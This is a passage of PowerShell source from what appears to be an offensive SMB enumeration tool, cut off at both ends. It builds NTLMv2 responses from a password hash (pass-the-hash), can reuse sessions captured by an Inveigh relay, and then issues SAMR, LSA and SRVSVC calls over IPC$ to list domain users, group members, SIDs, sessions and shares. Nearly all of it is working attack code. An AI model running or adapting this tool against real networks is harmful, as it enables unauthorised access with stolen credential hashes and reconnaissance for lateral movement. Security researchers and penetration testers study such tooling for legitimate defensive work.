                                    0x00,0x00,0x00,0x00 +
                                    $target_details +
                                    0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00

            $server_challenge_and_security_blob_bytes = $NTLM_challenge + $security_blob_bytes
            $HMAC_MD5.key = $NTLMv2_hash
            $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)

            if($SMB_signing)
            {
                $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)
                $session_key = $session_base_key
                $HMAC_SHA256 = New-Object System.Security.Cryptography.HMACSHA256
                $HMAC_SHA256.key = $session_key
            }

            $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
            $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)[0,1]
            $session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)

            $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                    0x03,0x00,0x00,0x00,
                                    0x18,0x00,
                                    0x18,0x00 +
                                    $auth_LM_offset +
                                    $NTLMv2_response_length +
                                    $NTLMv2_response_length +
                                    $auth_NTLM_offset +
                                    $auth_domain_length +
                                    $auth_domain_length +
                                    $auth_domain_offset +
                                    $auth_username_length +
                                    $auth_username_length +
                                    $auth_username_offset +
                                    $auth_hostname_length +
                                    $auth_hostname_length +
                                    $auth_hostname_offset +
                                    $session_key_length +
                                    $session_key_length +
                                    $session_key_offset +
                                    $negotiate_flags +
                                    $auth_domain_bytes +
                                    $auth_username_bytes +
                                    $auth_hostname_bytes +
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                    $NTLMv2_response

            if($SMB_version -eq 'SMB1')
            {
                $SMB_user_ID = $client_receive[32,33]
                $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID $SMB_user_ID

                if($SMB_signing)
                {
                    $packet_SMB_header["Flags2"] = 0x05,0x48
                }

                $packet_SMB_header["UserID"] = $SMB_user_ID
                $packet_NTLMSSP_negotiate = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate      
                $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
            }
            else
            {
                $message_ID++
                $packet_SMB_header = New-PacketSMB2Header 0x01,0x00 0x01,0x00 $false $message_ID  $process_ID $tree_ID $session_ID
                $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        
                $packet_SMB_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_auth
                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
            }

            try
            {
                $client_stream.Write($client_send,0,$client_send.Length) > $null
                $client_stream.Flush()
                $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                if($SMB_version -eq 'SMB1')
                {

                    if([System.BitConverter]::ToString($client_receive[9..12]) -eq '00-00-00-00')
                    {
                        Write-Verbose "[+] $output_username successfully authenticated on $Target"
                        Write-Output "[-] SMB1 is only supported with signing check and authentication"
                        $login_successful = $false
                    }
                    else
                    {
                        Write-Output "[!] $output_username failed to authenticate on $Target"
                        $login_successful = $false
                    }

                }
                else
                {
                    if([System.BitConverter]::ToString($client_receive[12..15]) -eq '00-00-00-00')
                    {
                        Write-Verbose "[+] $output_username successfully authenticated on $Target"
                        $login_successful = $true
                    }
                    else
                    {
                        Write-Output "[!] $output_username failed to authenticate on $Target"
                        $login_successful = $false
                    }

                }

            }
            catch
            {
                Write-Output "[-] $($_.Exception.Message)"
                $login_successful = $false
            }

        }

    }

    if($login_successful -or $inveigh_session)
    {

        if($inveigh_session)
        {

            if($inveigh_session -and $inveigh.session_lock_table[$session] -eq 'locked')
            {
                Write-Output "[*] Pausing due to Inveigh Relay session lock"
                Start-Sleep -s 2
            }

            $inveigh.session_lock_table[$session] = 'locked'
            $client = $inveigh.session_socket_table[$session]
            $client_stream = $client.GetStream()
            $session_ID = $inveigh.session_table[$session]
            $message_ID =  $inveigh.session_message_ID_table[$session]
            $tree_ID = 0x00,0x00,0x00,0x00
            $SMB_signing = $false
        }

        if($Action -eq 'All')
        {
            $action_stage = 'group'
        }
        else
        {
            $action_stage = $Action    
        }

        $path = "\\" + $Target + "\IPC$"
        $path_bytes = [System.Text.Encoding]::Unicode.GetBytes($path)
        $j = 0
        $stage = 'TreeConnect'

        while ($stage -ne 'Exit')
        {

            try
            {
                
                switch ($stage)
                {
            
                    'CloseRequest'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2CloseRequest $file_ID
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $stage = 'SendReceive'
                    }

                    'Connect2'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMRConnect2 $Target
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x06,0x00,0x00,0x00 0x00,0x00 0x39,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $stage = 'SendReceive'
                    }

                    'Connect5'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMRConnect5 $Target
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x06,0x00,0x00,0x00 0x00,0x00 0x40,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $stage = 'SendReceive'
                    }

                    'CreateRequest'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2CreateRequestFile $named_pipe
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data  
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data  
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        try
                        {
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                            
                            if(Get-StatusPending $client_receive[12..15])
                            {
                                $stage = 'StatusPending'
                            }
                            else
                            {
                                $stage = 'StatusReceived'
                            }
                            
                        }
                        catch
                        {
                            Write-Output "[-] Session connection is closed"
                            $stage = 'Exit'
                        }

                    }

                    'EnumDomainUsers'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMREnumDomainUsers $SAMR_domain_handle
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x08,0x00,0x00,0x00 0x00,0x00 0x0d,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $stage = 'SendReceive'
                    }

                    'GetMembersInAlias'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMRGetMembersInAlias $SAMR_policy_handle
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x0d,0x00,0x00,0x00 0x00,0x00 0x21,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $stage = 'SendReceive'
                    }

                    'Logoff'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2SessionLogoffRequest
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $stage = 'SendReceive'
                    }

                    'LookupNames'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMRLookupNames $SAMR_domain_handle $Group
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x08,0x00,0x00,0x00 0x00,0x00 0x11,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $stage = 'SendReceive'
                    }

                    'LookupRids'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMRLookupRids $SAMR_domain_handle $RID_count_bytes $RID_list
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x0b,0x00,0x00,0x00 0x00,0x00 0x12,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $stage = 'SendReceive'
                    }

                    'LSAClose'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_LSARPC_data = New-PacketLSAClose $policy_handle
                        $LSARPC_data = ConvertFrom-PacketOrderedDictionary $packet_LSARPC_data 
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $LSARPC_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $LSARPC_data.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $LSARPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $LSARPC_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $LSARPC_data
                        $step++
                        $stage = 'SendReceive'
                    }

                    'LSALookupSids'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_LSARPC_data = New-PacketLSALookupSids $policy_handle $SID_array
                        $LSARPC_data = ConvertFrom-PacketOrderedDictionary $packet_LSARPC_data
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $LSARPC_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $LSARPC_data.Length 0 0 0x10,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data   
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $LSARPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $LSARPC_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $LSARPC_data
                        $stage = 'SendReceive'
                    }

                    'LSAOpenPolicy'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_LSARPC_data = New-PacketLSAOpenPolicy
                        $LSARPC_data = ConvertFrom-PacketOrderedDictionary $packet_LSARPC_data 
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $LSARPC_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $LSARPC_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x06,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $LSARPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $LSARPC_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $LSARPC_data
                        $stage = 'SendReceive'
                    }

                    'LSAQueryInfoPolicy'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_LSARPC_data = New-PacketLSAQueryInfoPolicy $policy_handle
                        $LSARPC_data = ConvertFrom-PacketOrderedDictionary $packet_LSARPC_data
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $LSARPC_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $LSARPC_data.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x07,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data   
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $LSARPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $LSARPC_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $LSARPC_data
                        $stage = 'SendReceive'
                    }

                    'NetSessEnum'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SRVSVC_data = New-PacketSRVSVCNetSessEnum $Target
                        $SRVSVC_data = ConvertFrom-PacketOrderedDictionary $packet_SRVSVC_data
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SRVSVC_data.Length 1024
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SRVSVC_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00                        
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SRVSVC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SRVSVC_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SRVSVC_data
                        $stage = 'SendReceive'
                    }
                    
                    'NetShareEnumAll'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SRVSVC_data = New-PacketSRVSVCNetShareEnumAll $Target
                        $SRVSVC_data = ConvertFrom-PacketOrderedDictionary $packet_SRVSVC_data 
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SRVSVC_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SRVSVC_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SRVSVC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SRVSVC_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SRVSVC_data
                        $stage = 'SendReceive'
                    }

                    'OpenAlias'
                    {  
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMROpenAlias $SAMR_domain_handle $SAMR_RID
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x0c,0x00,0x00,0x00 0x00,0x00 0x1b,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
